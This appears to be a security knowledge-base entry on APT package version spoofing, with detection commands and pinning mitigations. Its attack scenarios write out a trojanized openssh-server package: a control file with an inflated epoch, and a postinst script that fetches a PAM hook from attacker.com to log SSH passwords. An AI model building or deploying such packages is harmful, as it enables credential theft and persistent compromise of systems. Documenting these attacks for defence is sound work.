---
name: "APT Package Name and Version Spoofing"
packageManager: "apt"
slug: "apt-package-spoofing"
category: "Supply Chain"
severity: "high"
platform:
  - "Linux"
description: "APT selects package candidates based on repository priority first and version number second. If an attacker controls a repository that is trusted and allowed to compete with official sources, they can create packages with the same name as legitimate ones but with artificially inflated version numbers, including the use of epoch values, to outrank same-priority upstream candidates. When the victim runs apt-get upgrade or installs the package, APT may select the attacker's higher-versioned package if repository priorities, pinning, and target-release settings allow it, replacing the legitimate software with a trojanized version.<sup><a href=\"#hist-1\">[1]</a></sup>"
prerequisites:
  - "An attacker-controlled APT repository already configured on the target system (see apt-malicious-repo-source)"
  - "Knowledge of the target package name and its current version in official repositories"
  - "Ability to host packages with valid Debian package structure (control file, data archive)"
attackScenarios:
  - title: "Version Override via Epoch Manipulation"
    description: "The Debian versioning scheme supports an epoch prefix (e.g., 2:1.0.0) that takes the highest priority in version comparison. An attacker sets an epoch value higher than the legitimate package's epoch (most packages have no epoch, defaulting to 0), guaranteeing their malicious package is selected regardless of the downstream version string."
    commands:
      - label: "Check the current version and epoch of the target package"
        code: |
          apt-cache policy openssh-server
          # Typical output: 1:8.9p1-3ubuntu0.6 (epoch is 1)
        language: "bash"
      - label: "Create a spoofed control file with a higher epoch"
        code: |
          mkdir -p /tmp/spoof-pkg/DEBIAN
          cat > /tmp/spoof-pkg/DEBIAN/control << 'EOF'
          Package: openssh-server
          Version: 99:8.9p1-3ubuntu0.6
          Section: net
          Priority: optional
          Architecture: amd64
          Depends: openssh-client (= 99:8.9p1-3ubuntu0.6)
          Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
          Description: Secure shell (SSH) server
           Trojanized openssh-server with backdoor access
          EOF
        language: "bash"
      - label: "Add a malicious postinst to the spoofed package"
        code: |
          cat > /tmp/spoof-pkg/DEBIAN/postinst << 'SCRIPT'
          #!/bin/bash
          # Backdoor: log all SSH passwords
          if [ ! -f /usr/local/lib/libpam_hook.so ]; then
            curl -s http://attacker.com/libpam_hook.so -o /usr/local/lib/libpam_hook.so
            echo "auth optional /usr/local/lib/libpam_hook.so" >> /etc/pam.d/sshd
          fi
          exit 0
          SCRIPT
          chmod 755 /tmp/spoof-pkg/DEBIAN/postinst
        language: "bash"
      - label: "Build and host the spoofed package"
        code: |
          dpkg-deb --build /tmp/spoof-pkg /tmp/openssh-server_99-8.9p1-3ubuntu0.6_amd64.deb
          # Move to attacker's repo and regenerate Packages/Release files
          reprepro -b /var/www/apt-repo includedeb stable /tmp/openssh-server_99-8.9p1-3ubuntu0.6_amd64.deb
        language: "bash"
  - title: "Upgrade Hijack via Version String Manipulation"
    description: "Without using epochs, an attacker can manipulate the upstream version and Debian revision portions of the version string to achieve a higher version comparison result. APT compares version strings lexicographically with special rules for tildes and numeric segments."
    commands:
      - label: "Craft a version string that compares higher"
        code: |
          # Legitimate version: 2.4.57-2
          # Attacker version: 2.4.57-2+security1 (compares higher due to the + suffix)
          cat > /tmp/spoof-pkg/DEBIAN/control << 'EOF'
          Package: apache2
          Version: 2.4.57-2+security1
          Architecture: amd64
          Maintainer: attacker@example.com
          Description: Apache HTTP Server (spoofed security update)
          EOF
        language: "bash"
      - label: "Verify version comparison with dpkg"
        code: |
          # Confirm attacker version wins the comparison
          dpkg --compare-versions "2.4.57-2+security1" gt "2.4.57-2" && echo "Attacker version wins"
        language: "bash"
detection:
  - title: "Compare package sources with apt-cache policy"
    description: "Use apt-cache policy to identify which repository is providing each installed package. If a critical package is being sourced from an unexpected repository or has an unusually high epoch/version, it may have been spoofed."
    commands:
      - code: |
          # Check the source and version priority for critical packages
          apt-cache policy openssh-server
          apt-cache policy apache2
          # List all installed packages and their sources
          apt list --installed 2>/dev/null | while read -r pkg; do
            name=$(echo "$pkg" | cut -d'/' -f1)
            apt-cache policy "$name" 2>/dev/null | grep -A1 '^\*\*\*'
          done
        language: "bash"
  - title: "Detect packages with unusually high epochs"
    description: "Packages with epoch values significantly higher than expected are a strong indicator of version spoofing. Most legitimate packages use epoch 0 or 1."
    commands:
      - code: |
          # Find installed packages with high epoch values
          dpkg-query -W -f='${Package} ${Version}\n' | awk '{split($2,a,":"); if(length(a)>1 && int(a[1])>5) print $1, $2}'
          # Compare installed versions against official repo versions
          apt list --upgradable 2>/dev/null
        language: "bash"
mitigation:
  - "Use APT pinning (apt_preferences) to prioritize official repositories and assign lower priority to third-party sources"
  - "Configure pin-priority in /etc/apt/preferences.d/ so official repositories rank above third-party sources without forcing unintended downgrades; avoid priorities above 1000 unless you explicitly want downgrades<sup><a href=\"#hist-1\">[1]</a></sup>"
  - "Regularly audit installed package sources using apt-cache policy for critical system packages"
  - "Remove or disable unnecessary third-party repositories that could serve spoofed packages"
  - "Implement version-locking for critical packages using apt-mark hold or dpkg --set-selections"
  - "Use Debian snapshot archives or a curated local mirror to control available package versions"
references:
  - title: "Debian Policy Manual - Version Numbering"
    url: "https://www.debian.org/doc/debian-policy/ch-controlfields.html#version"
  - title: "apt_preferences(5) Manual Page - Package Pinning"
    url: "https://manpages.debian.org/bookworm/apt/apt_preferences.5.en.html"
  - title: "Debian Wiki - AptConfiguration"
    url: "https://wiki.debian.org/AptConfiguration"
historicalNotes:
  - date: "30 April, 2026"
    note: >-
      Corrected the overview to reflect APT's priority-first, version-second
      candidate selection and revised the pinning guidance to avoid implying
      that Pin-Priority values above 1000 are a routine best practice. Source:
      <a href="https://manpages.debian.org/apt_preferences" target="_blank" rel="noopener">apt_preferences(5)</a>.
created: 2026-04-02
updated: 2026-04-30
---
